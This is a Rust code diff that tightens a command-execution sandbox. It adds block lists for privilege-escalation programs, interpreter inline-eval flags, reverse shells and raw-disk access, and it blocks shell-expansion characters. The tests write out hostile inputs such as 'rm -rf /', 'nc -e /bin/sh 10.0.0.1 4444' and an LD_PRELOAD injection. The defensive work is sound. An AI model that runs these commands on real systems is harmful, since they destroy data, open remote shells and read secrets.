@@ -144,20 +144,31 @@ const BLOCKLIST: &[&str] = &[
 const SHELL_MODE_BLOCKLIST: &[&str] = &["alias ", "function ", "declare -f"];
 
 /// Programs blocked at the ARGV floor by their BASENAME alone — their mere
-/// invocation is dangerous regardless of arguments (privilege escalation +
-/// system control). The argv form (`shell: false`) has no shell to hide a
-/// program behind, so an EXACT basename match is precise: no substring
-/// false-positives (`issue` ≠ `su`, `printenv` ≠ `env`), and no need to scan
-/// the (literal, un-parsed) arguments at all. Deciding WHICH non-listed
-/// program may run, and what it may touch, is `permits.exec` (allowlist) +
-/// the sandbox — NOT this floor. `command[0]` can itself be an interpolated,
-/// attacker-influenced value, so [`check_program`] still NFKC-normalizes
-/// confusables (fullwidth `ｓｕｄｏ` → `sudo`) before matching.
+/// invocation is dangerous regardless of arguments. `command[0]` can be an
+/// interpolated, attacker-influenced value, so [`check_program`] NFKC-
+/// normalizes confusables (fullwidth `ｓｕｄｏ` → `sudo`) before the EXACT
+/// basename match (no substring false-positives · `issue` ≠ `su`). The argv
+/// re-exec class (interpreter `-c`/`-e`, `nc -e`, `dd if=`) is handled
+/// structurally by [`check_argv`] — symmetric with shell mode.
 const DANGEROUS_PROGRAMS: &[&str] = &[
     // Privilege escalation
     "sudo", "doas", "pkexec", "su", "runas",
     // System control (halts / reboots / powers off the host)
     "shutdown", "reboot", "halt", "poweroff",
+    // Re-exec / env re-injection (review P0): `env VAR=x cmd` re-adds a
+    // stripped var into the child (defeats the env scrub); `xargs` runs a
+    // command built from its input. Workflows use the `env:` field, not `env`.
+    "env", "xargs",
+];
+
+/// Shell + interpreter basenames whose INLINE-EVAL form re-parses an argument
+/// AS code — the argv re-exec class shell mode blocks (`sh -c` · `python -c` ·
+/// `perl -e` · `node -e`) but a name-only check would miss. Running them on a
+/// SCRIPT FILE (`["python", "app.py"]`) stays allowed; only an inline-eval
+/// flag is refused at the floor (route a genuine need via `pre_validated`).
+const RE_EXEC_INTERPRETERS: &[&str] = &[
+    "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", //
+    "python", "python2", "python3", "perl", "ruby", "node", "php", "deno", "bun",
 ];
 
 /// Zero-width / invisible characters stripped before the blocklist check
@@ -262,15 +273,20 @@ pub(crate) fn check_shell_mode(command: &str) -> Result<(), ShellError> {
             });
         }
     }
-    // SECURITY (P1 · Gate-11 swarm): `sh -c` expands `$VAR` / `${IFS}` /
-    // `$(...)` / `$'\t'` and backticks AFTER this check — the structural
-    // TOCTOU that lets `rm${IFS}-rf${IFS}/` render to `rm -rf /` past a
-    // template-only blocklist. A baseline mechanism cannot safely predict
-    // the expansion, so it REFUSES expansion/substitution chars outright.
-    // (NFKC has already folded the fullwidth `＄` U+FF04 → `$`.) Callers that
-    // genuinely need expansion go through nika-policy, which validates intent
-    // and sets `pre_validated` — this whole check is then skipped.
-    if let Some(c) = normalized.chars().find(|&c| c == '$' || c == '`') {
+    // SECURITY (Gate-11 swarm + review P1): `sh -c` performs EXPANSION after
+    // this static check — the structural TOCTOU class. `$VAR`/`${IFS}`/`$(…)`/
+    // backticks render `rm${IFS}-rf${IFS}/` → `rm -rf /`; pathname globbing
+    // (`* ? [`), brace `{…}`, and tilde `~` render `/usr/bin/sud*` → `sudo`;
+    // a `(…)` sub-shell / process-substitution runs a nested program. A
+    // baseline mechanism cannot predict any of these, so it REFUSES the
+    // expansion / substitution / grouping chars outright. Pipes `|` and
+    // redirects `<`/`>` are NOT expansion — they stay allowed. (NFKC has
+    // folded the fullwidth `＄` U+FF04 → `$`.) A genuine need goes through
+    // nika-policy, which sets `pre_validated` — this check is then skipped.
+    if let Some(c) = normalized
+        .chars()
+        .find(|&c| matches!(c, '$' | '`' | '*' | '?' | '[' | '{' | '~' | '('))
+    {
         return Err(ShellError::Blocked {
             reason: format!(
                 "shell-mode expansion/substitution char refused: {c:?} (route via pre_validated)"
@@ -280,37 +296,99 @@ pub(crate) fn check_shell_mode(command: &str) -> Result<(), ShellError> {
     Ok(())
 }
 
-/// Check an argv-form PROGRAM against the dangerous-program floor.
-///
-/// Argv mode (`shell: false`) runs the program via `execve` with no shell, so
-/// arguments are literal and the shell-syntax blocklist ([`check_command`])
-/// does not apply — scanning a joined line would false-positive on benign
-/// literal args. The only floor that makes sense is the program's IDENTITY:
-/// an exact basename match against [`DANGEROUS_PROGRAMS`], after NFKC +
-/// zero-width normalization (because `command[0]` may be an interpolated,
-/// attacker-influenced value). Quoting is NOT stripped — `execve` takes the
-/// program name literally, so `su""do` is a (non-existent) filename, not
-/// `sudo`.
+/// The normalized lowercase BASENAME of an argv program — NFKC + zero-width
+/// folding (because `command[0]` may be an interpolated, attacker-influenced
+/// value), then the path tail. Quoting is NOT stripped — `execve` takes the
+/// program literally, so `su""do` is a (non-existent) filename, not `sudo`.
+fn program_basename(program: &str) -> String {
+    let normalized = normalize_for_blocklist(program);
+    normalized
+        .rsplit(['/', '\\'])
+        .next()
+        .unwrap_or(normalized.as_str())
+        .to_lowercase()
+}
+
+/// Check an argv-form PROGRAM's IDENTITY against [`DANGEROUS_PROGRAMS`] (an
+/// exact basename match · no substring false-positives).
 ///
 /// # Errors
 ///
 /// [`ShellError::Blocked`] when the program basename is a dangerous program.
 pub(crate) fn check_program(program: &str) -> Result<(), ShellError> {
-    let normalized = normalize_for_blocklist(program);
-    let basename = normalized
-        .rsplit(['/', '\\'])
-        .next()
-        .unwrap_or(normalized.as_str());
-    let lower = basename.to_lowercase();
-    if DANGEROUS_PROGRAMS.contains(&lower.as_str()) {
+    let base = program_basename(program);
+    if DANGEROUS_PROGRAMS.contains(&base.as_str()) {
         return Err(ShellError::Blocked {
             reason: format!(
-                "program {basename:?} is blocked at the exec floor \
-                 (privilege escalation / system control)"
+                "program {base:?} is blocked at the exec floor \
+                 (privilege escalation / system control / re-exec)"
             ),
         });
     }
     Ok(())
+}
+
+/// Check a full argv-form command at the floor: the program IDENTITY
+/// ([`check_program`]) PLUS the structural re-exec class that shell mode
+/// blocks but a name-only check misses — an interpreter invoked with an
+/// inline-eval flag (`["sh","-c",…]` · `["python","-c",…]` · `["perl","-e",…]`),
+/// `nc -e`/`-c` (reverse shell), `dd if=`/`of=` (raw disk). Checked
+/// STRUCTURALLY (per discrete argv element), so a LITERAL argument that merely
+/// CONTAINS such text is NOT a false positive — the difference from a joined-
+/// string scan. Without this the argv form re-introduces every interpreter /
+/// `env` danger shell mode forbids (review P0).
+///
+/// # Errors
+///
+/// [`ShellError::Blocked`] on a dangerous program or a re-exec form.
+pub(crate) fn check_argv(program: &str, args: &[String]) -> Result<(), ShellError> {
+    check_program(program)?;
+    let base = program_basename(program);
+
+    if RE_EXEC_INTERPRETERS.contains(&base.as_str()) && args.iter().any(|a| is_inline_eval_flag(a))
+    {
+        return Err(ShellError::Blocked {
+            reason: format!(
+                "argv interpreter inline-eval refused: {base:?} with an eval flag \
+                 (-c/-e/-r) runs attacker-influenceable code — run a script file \
+                 or route via pre_validated"
+            ),
+        });
+    }
+    if matches!(base.as_str(), "nc" | "ncat")
+        && args
+            .iter()
+            .any(|a| a.starts_with("-e") || a.starts_with("-c"))
+    {
+        return Err(ShellError::Blocked {
+            reason: "argv `nc -e/-c` (reverse shell) refused at the exec floor".to_string(),
+        });
+    }
+    if base == "dd"
+        && args
+            .iter()
+            .any(|a| a.starts_with("if=") || a.starts_with("of="))
+    {
+        return Err(ShellError::Blocked {
+            reason: "argv `dd if=/of=` (raw disk read/write) refused at the exec floor".to_string(),
+        });
+    }
+    Ok(())
+}
+
+/// Whether an interpreter arg requests INLINE code evaluation (vs running a
+/// script file): the short eval flags (`-c` sh/python · `-e`/`-E` perl/ruby/
+/// node · `-r` php · `-p` node-print) and the `--eval`/`--print` long forms;
+/// bundled forms (`-ce`, `-pe`) match by prefix. A script-file argument is not
+/// a flag, so `["python", "app.py"]` stays allowed.
+fn is_inline_eval_flag(arg: &str) -> bool {
+    const LONG: &[&str] = &["--eval", "--print", "--exec", "--command"];
+    LONG.contains(&arg)
+        || arg.starts_with("-c")
+        || arg.starts_with("-e")
+        || arg.starts_with("-E")
+        || arg.starts_with("-r")
+        || arg.starts_with("-p")
 }
 
 #[cfg(test)]
@@ -596,7 +674,7 @@ mod tests {
         // nice) and ordinary tools pass the argv floor — checked by identity,
         // not by a fake-shell scan of their arguments.
         for ok in [
-            "echo", "cargo", "git", "npm", "ffmpeg", "timeout", "env", "nice", "rm", "printenv",
+            "echo", "cargo", "git", "npm", "ffmpeg", "timeout", "nice", "rm", "printenv",
         ] {
             assert!(check_program(ok).is_ok(), "argv floor must allow: {ok}");
         }
@@ -614,5 +692,90 @@ mod tests {
         // NOT `sudo` (no shell to strip the quotes), so the floor allows it
         // (it would simply fail to spawn as NotFound).
         assert!(check_program("su\"\"do").is_ok());
+    }
+
+    // ── argv re-exec class (check_argv · review P0) ──────────────────
+
+    fn argv_blocked(program: &str, args: &[&str]) -> bool {
+        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
+        matches!(check_argv(program, &owned), Err(ShellError::Blocked { .. }))
+    }
+
+    fn argv_ok(program: &str, args: &[&str]) -> bool {
+        let owned: Vec<String> = args.iter().map(|s| (*s).to_string()).collect();
+        check_argv(program, &owned).is_ok()
+    }
+
+    #[test]
+    fn argv_floor_blocks_interpreter_inline_code() {
+        // The re-exec class shell mode forbids must NOT be reachable via argv.
+        assert!(argv_blocked("sh", &["-c", "rm -rf /"]));
+        assert!(argv_blocked("bash", &["-c", "evil"]));
+        assert!(argv_blocked("/usr/bin/python3", &["-c", "import os"]));
+        assert!(argv_blocked("perl", &["-e", "system('id')"]));
+        assert!(argv_blocked("node", &["-e", "process.exit()"]));
+        assert!(argv_blocked("ruby", &["-e", "x"]));
+        assert!(argv_blocked("node", &["--eval", "x"])); // long form
+        assert!(argv_blocked("python", &["-c"])); // the eval flag is the signal
+    }
+
+    #[test]
+    fn argv_floor_allows_interpreters_on_script_files() {
+        // The legit case — an interpreter on a SCRIPT FILE (no eval flag).
+        assert!(argv_ok("python3", &["app.py", "--port", "8080"]));
+        assert!(argv_ok("node", &["server.js"]));
+        assert!(argv_ok("bash", &["deploy.sh", "prod"]));
+        assert!(argv_ok("ruby", &["rake", "test"]));
+        assert!(argv_ok("python", &["-m", "pytest"])); // -m is module, not eval
+    }
+
+    #[test]
+    fn argv_floor_blocks_env_reinjection_and_reverse_shells() {
+        // `env` re-adds a stripped var into the child → defeats the env scrub.
+        assert!(argv_blocked(
+            "env",
+            &["LD_PRELOAD=/tmp/x.so", "cat", "/secret"]
+        ));
+        assert!(argv_blocked("/usr/bin/env", &["sh", "-c", "evil"]));
+        assert!(argv_blocked("xargs", &["rm"]));
+        assert!(argv_blocked("nc", &["-e", "/bin/sh", "10.0.0.1", "4444"]));
+        assert!(argv_blocked("ncat", &["-c", "sh"]));
+        assert!(argv_blocked("dd", &["if=/dev/sda", "of=/dev/null"]));
+    }
+
+    #[test]
+    fn argv_floor_allows_ordinary_argv_with_metachar_args() {
+        // The Step-2 property holds: a LITERAL arg carrying shell metacharacters
+        // (or interpreter-flag TEXT) is NOT a false positive — no shell, and
+        // check_argv is structural (per element).
+        assert!(argv_ok("echo", &["a; b | c"]));
+        assert!(argv_ok("printf", &["%s", "; rm -rf /"]));
+        assert!(argv_ok("echo", &["run python -c please"])); // literal text
+        assert!(argv_ok("git", &["commit", "-m", "node -e fix"]));
+        assert!(argv_ok("nc", &["-l", "8080"])); // listener (no -e/-c)
+        assert!(argv_ok("dd", &["--version"])); // no if=/of=
+    }
+
+    // ── shell-mode expansion/glob refusal (review P1) ────────────────
+
+    #[test]
+    fn shell_mode_refuses_glob_brace_tilde_subshell() {
+        // Runtime expansion reconstructs a blocked program past the static scan
+        // (`/usr/bin/sud*` → sudo) — the same TOCTOU class as `${IFS}`.
+        assert!(shell_blocked("/usr/bin/sud* root")); // glob → sudo
+        assert!(shell_blocked("/sbin/rebo*")); // glob → reboot
+        assert!(shell_blocked("echo {a,b}")); // brace
+        assert!(shell_blocked("cat ~/secret")); // tilde
+        assert!(shell_blocked("(reboot)")); // sub-shell
+        assert!(shell_blocked("ls ?")); // single-char glob
+    }
+
+    #[test]
+    fn shell_mode_still_allows_pipes_and_redirects() {
+        // Pipes/redirects are NOT expansion — the genuine-pipeline use case the
+        // architecture preserves stays allowed.
+        assert!(check_shell_mode("cat a.log | grep error").is_ok());
+        assert!(check_shell_mode("echo hi > out.txt").is_ok());
+        assert!(check_shell_mode("sort < in.txt").is_ok());
     }
 }
